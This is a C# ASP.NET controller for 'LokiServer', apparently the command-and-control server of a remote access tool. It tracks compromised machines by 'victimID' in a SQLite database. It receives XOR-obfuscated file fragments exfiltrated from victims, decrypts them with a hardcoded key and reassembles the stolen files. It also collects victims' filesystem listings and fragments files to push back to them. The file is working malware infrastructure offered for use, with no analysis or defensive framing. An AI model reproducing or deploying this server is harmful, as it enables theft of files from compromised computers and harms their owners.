using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Data.SQLite;
using System.IO;

namespace LokiServer.Controllers
{
    // declare global variable
    public class Global
    {
        public static int FRAGMENTED_FILE = 1000;
    }
    public class SendRequest
    {
        public string victimID { get; set; }
        public string actionID { get; set; }
    }
    public class ReadRequest
    {
        public string id { get; set; }
    }

    public class ReadFileRequestReceiver
    {
        public string id { get; set; }
    }

    

    

    public class FileSystemRequest
    {
        public string victimID { get; set; }
        public string actionID { get; set; }
        public string fileSystemStructure { get; set; }
    }

    [ApiController]
    [Route("[controller]")]
    public class FileController : ControllerBase
    {

        public IActionResult ReceiveFragmentedFile()
        {
            try
             {
                var files = Request.Form.Files;
                if (files != null && files.Count > 0)
                {
                    foreach (var file in files)
                    {
                        MemoryStream fragmentMemoryStream = new MemoryStream();
                        file.CopyTo(fragmentMemoryStream);
                        byte[] encryptedFragment = fragmentMemoryStream.ToArray();

                        string fileName = $"received_file_part_{Guid.NewGuid()}.txt";
                        // get current directory
                        string directory = Directory.GetCurrentDirectory();
                        // Create a new folder if it does not exist called Files
                        string folder = Path.Combine(directory, "Files");
                        if (!Directory.Exists(folder))
                        {
                            Directory.CreateDirectory(folder);
                        }
                        string outputPath = Path.Combine(string.Format("{0}\\{1}", folder, fileName));
                        System.IO.File.WriteAllBytes(outputPath, encryptedFragment);

                        DecryptFileWithXOR(outputPath);
                        joinFragmentFiles(folder);
                    }

                    return Ok("Fragment(s) of file received and decrypted successfully.");
                }
                else
                {
                    return BadRequest("No fragment of file received.");
                }
            }
            catch (Exception ex)
            {
                return StatusCode(500, $"Internal server error: {ex.Message}");
            }
        }


        [HttpPost]
        [Route("Send")]
        public string SendFragmentedFile(SendRequest request)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "SELECT Output FROM Output WHERE ActionID = @ActionID AND VictimID = @VictimID ORDER BY ID DESC LIMIT 1";
            string fileName = "";

            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@ActionID", request.actionID);
                cmd.Parameters.AddWithValue("@VictimID", request.victimID);
                using SQLiteDataReader reader = cmd.ExecuteReader();
                if (reader.Read())
                {
                    fileName = reader.GetString(reader.GetOrdinal("Output"));
                    string[] fragmentedFiles = SplitFile(fileName, 3);
                    string returnString = "";
                    foreach(var fragment in fragmentedFiles)
                    {
                        DecryptFileWithXOR(fragment);
                        // read the file and store the content in a byte array
                        byte[] fragmentBytes = System.IO.File.ReadAllBytes(fragment);
                        string insertQuery = "INSERT INTO Output (VictimID, ActionID, Output) VALUES (@VictimID, @ActionID, @Output)";
                        using (SQLiteCommand insertCmd = new SQLiteCommand(insertQuery, conn))
                        {
                            insertCmd.Parameters.AddWithValue("@VictimID", request.victimID);
                            insertCmd.Parameters.AddWithValue("@ActionID", request.actionID);
                            insertCmd.Parameters.AddWithValue("@Output", fragmentBytes);
                            insertCmd.ExecuteNonQuery();
                            //Get the last inserted ID
                            long lastRowId = conn.LastInsertRowId;
                            returnString += lastRowId + ",";
                        }
                    }
                    DeleteFiles(fragmentedFiles);
                    return returnString;
                }
            }
            return "";
        }

        [HttpPost]
        [Route("Read")]
        public string Read(ReadRequest request)
        {
             SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
             conn.Open();
             string query = "SELECT Output FROM Output WHERE ID = @Id";

            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@Id", request.id);
                using (SQLiteDataReader reader = cmd.ExecuteReader()){
                    if (reader.HasRows)
                    {
                        reader.Read();
                        string result = reader.GetString(reader.GetOrdinal("Output"));
                        return result;
                    }
                    else
                    {
                        return null;
                    }
                }
            }
        }

        
        [HttpPost]
        [Route("FileSystem")]
        public IActionResult ReceiveFileSystemStructure(FileSystemRequest request)
        {
            try
            {
                if (!ModelState.IsValid)
                {
                    // Devolver detalles de validación
                    return BadRequest(ModelState);
                }
                SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
                conn.Open();

                string insertQuery = "INSERT INTO Output (VictimID, ActionID, Output) VALUES (@VictimID, @ActionID, @Output)";
                using (SQLiteCommand insertCmd = new SQLiteCommand(insertQuery, conn))
                {
                    insertCmd.Parameters.AddWithValue("@VictimID", request.victimID);
                    insertCmd.Parameters.AddWithValue("@ActionID", request.actionID);
                    insertCmd.Parameters.AddWithValue("@Output", request.fileSystemStructure);
                    insertCmd.ExecuteNonQuery();
                }

                return Ok("FileSystemStructure received and saved successfully.");
            }
            catch (Exception ex)
            {
                Console.Write(ex.ToString());
                return StatusCode(500, $"Internal server error: {ex.Message}");
            }
        }

        [HttpPost]
        [Route("ReadFile")]
        public string ReadFile(ReadFileRequestReceiver request)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "SELECT Output FROM Output WHERE VictimID = @VictimID AND ActionID = 18 ORDER BY ID DESC LIMIT 1";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        return reader["Output"].ToString();
                    }
                }
            }
            return "";
        }




        private string getLastFileName(int actionID)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "SELECT Parameters FROM Action WHERE ActionID = @ActionID ORDER BY ID DESC LIMIT 1";
            string fileName = "";

            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@ActionID", actionID);
                using SQLiteDataReader reader = cmd.ExecuteReader();
                if (reader.Read())
                {
                    // parameters example: url=http://localhost:5068/File,filePath=C:\Users\Public\Music\test.txt 
                    // i want to get the filePath parameter
                    string[] parameters = reader.GetString(reader.GetOrdinal("Parameters")).Split(',');
                    foreach (var parameter in parameters)
                    {
                        if (parameter.Contains("filePath"))
                        {
                            return parameter.Split('=')[1];
                        }
                    }
                    return fileName;
                }
            }
            return "";
        }

        private void DecryptFileWithXOR(string filePath)
        {
            try
            {
                byte xorKey = (byte)'S'; 

                byte[] encryptedBytes = System.IO.File.ReadAllBytes(filePath);
                for (int i = 0; i < encryptedBytes.Length; i++)
                {
                    encryptedBytes[i] ^= xorKey;
                }
                System.IO.File.WriteAllBytes(filePath, encryptedBytes);
            }
            catch (Exception ex)
            {
                throw new Exception($"Error al desencriptar el archivo: {ex.Message}");
            }
        }

        private void joinFragmentFiles(string directoryPath)
        {
            try
            {
                string finalFileName = getLastFileName(15);
                int index = finalFileName.LastIndexOf("\\");
                if (index == -1)
                {
                    index = finalFileName.LastIndexOf("/");
                }
                finalFileName = finalFileName.Substring(index + 1);
                string finalFilePath = Path.Combine(directoryPath, finalFileName);
                string[] fragmentFiles = Directory.GetFiles(directoryPath, "received_file_part_*.txt");

                if (fragmentFiles.Length == 3)
                {
                    // Ordenar los archivos por fecha de creación
                    var sortedFiles = fragmentFiles
                        .Select(f => new FileInfo(f))
                        .OrderBy(f => f.CreationTime)
                        .Select(f => f.FullName)
                        .ToArray();

                    using (var finalFileStream = new FileStream(finalFilePath, FileMode.Append))
                    {
                        foreach (var fragmentFile in sortedFiles)
                        {
                            byte[] fragmentBytes = System.IO.File.ReadAllBytes(fragmentFile);
                            finalFileStream.Write(fragmentBytes, 0, fragmentBytes.Length);
                            System.IO.File.Delete(fragmentFile);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                throw new Exception($"Error al unir los fragmentos de archivo: {ex.Message}");
            }
        }




        static string[] SplitFile(string filePath, int numChunks)
        {
            List<string> fragmentNames = new List<string>();
            try
            {
                using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    long fileSize = fileStream.Length;
                    int chunkSize = (int)(fileSize / numChunks);
                    byte[] buffer = new byte[1024];
                    for (int i = 0; i < numChunks; ++i)
                    {
                        //string currentPath = Path.GetDirectoryName(filePath);
                        string currentPath = Directory.GetCurrentDirectory();
                        currentPath = Path.Combine(currentPath, "Files");
                        string chunkFileName = Path.Combine(currentPath, $"fragment.part{i + 1}");
                        fragmentNames.Add(chunkFileName);
                        using (FileStream chunkStream = new FileStream(chunkFileName, FileMode.Create, FileAccess.Write))
                        {
                            int bytesRead = 0;
                            int totalBytesRead = 0;
                            while (totalBytesRead < chunkSize && (bytesRead = fileStream.Read(buffer, 0, Math.Min(chunkSize - totalBytesRead, buffer.Length))) > 0)
                            {
                                chunkStream.Write(buffer, 0, bytesRead);
                                totalBytesRead += bytesRead;
                            }
                        }
                    }
                }
                Console.WriteLine("Archivo dividido exitosamente.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            return fragmentNames.ToArray();
        }

        static void DeleteFiles(string[] fileNames)
        {
            try
            {
                foreach (string fileName in fileNames)
                {
                    if (System.IO.File.Exists(fileName))
                    {
                        System.IO.File.Delete(fileName);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al eliminar archivos: {ex.Message}");
            }
        }


    }
}
